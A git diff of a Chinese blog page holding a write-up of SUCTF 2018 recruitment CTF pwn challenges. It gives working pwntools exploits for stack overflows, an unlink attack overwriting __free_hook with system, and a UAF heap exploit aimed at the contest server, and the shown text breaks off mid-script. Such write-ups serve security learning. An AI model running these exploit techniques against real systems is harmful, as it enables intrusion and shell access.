@@ -1,1059 +1,810 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>SUCTF 招新赛 2018 writeup - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。 basic-pwn简单的栈溢出 直接上exp: 12345from pwn import*p = process(&apos;pwn&apos;)payload = &apos;a&apos;*280 + p64(0x4005c7)p.sendline(payload)p.interactive()">
-<meta name="keywords" content="writeup,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="SUCTF 招新赛 2018 writeup">
-<meta property="og:url" content="http://yoursite.com/2018/11/19/2018-11-19-SUCTF-招新赛-2018-writeup/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。 basic-pwn简单的栈溢出 直接上exp: 12345from pwn import*p = process(&apos;pwn&apos;)payload = &apos;a&apos;*280 + p64(0x4005c7)p.sendline(payload)p.interactive()">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1542680568249.png">
-<meta property="og:image" content="http://yoursite.com/picture/1542680869571.png">
-<meta property="og:image" content="http://yoursite.com/picture/1542680974136.png">
-<meta property="og:updated_time" content="2019-01-02T08:09:19.076Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SUCTF 招新赛 2018 writeup">
-<meta name="twitter:description" content="前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。 basic-pwn简单的栈溢出 直接上exp: 12345from pwn import*p = process(&apos;pwn&apos;)payload = &apos;a&apos;*280 + p64(0x4005c7)p.sendline(payload)p.interactive()">
-<meta name="twitter:image" content="http://yoursite.com/picture/1542680568249.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/11/19/2018-11-19-SUCTF-招新赛-2018-writeup/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>SUCTF 招新赛 2018 writeup | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/2018-11-19-SUCTF-招新赛-2018-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">SUCTF 招新赛 2018 writeup
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-11-19 11:10:05" itemprop="dateCreated datePublished" datetime="2018-11-19T11:10:05+08:00">2018-11-19</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-01-02 16:09:19" itemprop="dateModified" datetime="2019-01-02T16:09:19+08:00">2019-01-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF-s-writeup/" itemprop="url" rel="index"><span itemprop="name">CTF's writeup</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Monday, November 19th 2018, 11:10 am
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      10 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。</p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>前段时间做了下SUCTF的招新赛的pwn题，题目还是很友好的，适合新手。但是一直没有写writeup，现在有时间就把writeup写了。</p>
 <h4 id="basic-pwn"><a href="#basic-pwn" class="headerlink" title="basic-pwn"></a>basic-pwn</h4><p>简单的栈溢出</p>
 <p>直接上exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'pwn'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">280</span> + p64(<span class="number">0x4005c7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import*
+p = process(&#39;pwn&#39;)
+payload = &#39;a&#39;*280 + p64(0x4005c7)
+p.sendline(payload)
+p.interactive()
+</code></pre>
 <h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h4><p>也是简单栈溢出，和basic-pwn差不多</p>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x400676</span>)</span><br><span class="line">p.recvuntil(<span class="string">"============================\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import*
+p=process(&quot;./pwn&quot;)
+payload=&#39;a&#39;*0x28+p64(0x400676)
+p.recvuntil(&quot;============================\n&quot;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
 <h4 id="babyarray"><a href="#babyarray" class="headerlink" title="babyarray"></a>babyarray</h4><p>数组下标溢出，将特定变量覆盖为0就可以了。</p>
 <p>输入 的下标为-14，值为0 。</p>
 <h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><p>一道简单的unlink题。改写__free_hook为system函数，再free掉一个包含“/bin/sh”字符串的chunk，就可以getshell</p>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./unlink'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./unlink'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"43.254.3.203"</span>,<span class="number">10005</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./unlink'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touch</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please chooice :\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"size : \n"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please chooice :\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">" delete\n"</span>,str(idx))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please chooice :\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"show\n"</span>,str(idx))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">take</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"please chooice :\n"</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"modify :\n"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"content\n"</span>,content)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">ptr  = <span class="number">0x06020C0</span></span><br><span class="line"></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x90</span>) + p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>) </span><br><span class="line">fake_chunk = fake_chunk.ljust(<span class="number">0x90</span>,<span class="string">'a'</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">touch(<span class="number">0x90</span>)</span><br><span class="line">touch(<span class="number">0x80</span>)																			</span><br><span class="line">touch(<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">touch(<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"the content is : \n"</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(leak))</span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">0x58</span>		</span><br><span class="line">libc.address = libc_base</span><br><span class="line">log.info(hex(libc_base))</span><br><span class="line">take(<span class="number">0</span>,fake_chunk)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">take(<span class="number">2</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">take(<span class="number">0</span>,payload)</span><br><span class="line">take(<span class="number">0</span>,p64(libc.symbols[<span class="string">'system'</span>])*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+local = 0
+
+if local:
+    p = process(&#39;./unlink&#39;)
+    elf = ELF(&#39;./unlink&#39;)
+    libc = elf.libc
+else:
+    p = remote(&quot;43.254.3.203&quot;,10005)
+    elf = ELF(&#39;./unlink&#39;)
+    libc = ELF(&#39;./libc-2.23.so&#39;)
+
+context.arch = elf.arch
+context.log_level=&#39;debug&#39;
+
+def touch(size):
+    p.sendlineafter(&quot;please chooice :\n&quot;,&quot;1&quot;)
+    p.sendlineafter(&quot;size : \n&quot;,str(size))
+
+def delete(idx):
+    p.sendlineafter(&quot;please chooice :\n&quot;,&quot;2&quot;)
+    p.sendlineafter(&quot; delete\n&quot;,str(idx))
+
+def show(idx):
+    p.sendlineafter(&quot;please chooice :\n&quot;,&quot;3&quot;)
+    p.sendlineafter(&quot;show\n&quot;,str(idx))
+
+
+def take(idx,content):
+    p.sendlineafter(&quot;please chooice :\n&quot;,&quot;4&quot;)
+    p.sendlineafter(&quot;modify :\n&quot;,str(idx))
+    p.sendlineafter(&quot;content\n&quot;,content)
+
+
+ptr  = 0x06020C0
+
+fake_chunk = p64(0) + p64(0x90) + p64(ptr - 0x18) + p64(ptr - 0x10) 
+fake_chunk = fake_chunk.ljust(0x90,&#39;a&#39;)
+fake_chunk += p64(0x90) + p64(0x90)
+
+touch(0x90)
+touch(0x80)                                                                            
+touch(0x20)
+delete(0)
+touch(0x90)
+show(0)
+p.recvuntil(&quot;the content is : \n&quot;)
+leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+log.info(hex(leak))
+libc_base = leak - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 0x58        
+libc.address = libc_base
+log.info(hex(libc_base))
+take(0,fake_chunk)
+delete(1)
+
+payload = &#39;a&#39;*0x18 + p64(libc.symbols[&#39;__free_hook&#39;])
+take(2,&quot;/bin/sh&quot;)
+take(0,payload)
+take(0,p64(libc.symbols[&#39;system&#39;])*2)
+delete(2)
+
+p.interactive()
+</code></pre>
 <h4 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h4><p>网鼎杯半决赛的原题，就改了下字符串。漏洞点是一个UAF。</p>
 <p>利用方法，先利用unsorted bin将libc地址泄露出来，然后利用UAF漏洞来进行fastbins_dup 分配到包含__malloc_hook的chunk，改写 _malloc_hook为one_gadget，最后通过doublefreee触发  _malloc_printerr 来getshell。</p>
 <p>详情可以看我之前网鼎杯的<a href="https://www.jianshu.com/p/7e44cd4d5f7f" target="_blank" rel="noopener">writeup地址</a></p>
 <p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./ez_heap'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./ez_heap'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = <span class="string">'43.254.3.203'</span></span><br><span class="line">    port = <span class="string">'10006'</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line">    elf = ELF(<span class="string">'./ez_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,name,t)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Length of the name :'</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'The name of animal :'</span>)</span><br><span class="line">    sd(name)</span><br><span class="line">    ru(<span class="string">'The kind of the animal :'</span>)</span><br><span class="line">    sl(t)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span 